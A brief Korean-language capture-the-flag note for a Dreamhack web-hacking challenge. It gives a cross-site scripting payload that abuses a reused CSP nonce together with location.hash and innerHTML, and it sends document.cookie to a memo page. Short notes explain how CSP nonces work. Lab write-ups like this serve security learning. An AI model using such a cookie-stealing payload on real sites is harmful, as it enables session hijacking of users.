#web-hacking
# Payload
```text
http://host8.dreamhack.games:9600/vuln?param=<script id=name></script>#location.href='/memo?memo='+document.cookie//

/flag 경로에 각각 다음을 입력
<script id=name></script>
location.href='/memo?memo='+document.cookie//
```
- nonce가 의미하는게 무엇인지 확인
	- CSP 헤더 : 개발자 도구 - 네트워크 - 요청 - 헤더 - 응답 헤더 - Content-Security-Policy 맨 마지막 확인
	- https://content-security-policy.com/strict-dynamic
	- 페이지가 로딩될 때마다 바뀌는게 정상.
		- 만약 바뀌지 않는다면 CSRF 취약점이 될 수 있음.
	- nonce가 같다면 javascript를 실행할 수 있음.
	- 한 nonce 범위 안에 있는 html을 내가 원하는 대로 조절할 수 있다면 삽입한 html과 스크립트는 실행 가능
		- 이제 location.hash.slice(1)의 내용을 조절해서 XSS가 작동하도록 해야함
- vuln.html에 있는 내용 중 `innerHTML`, `location.hash.slice(1)` 을 활용해야함.
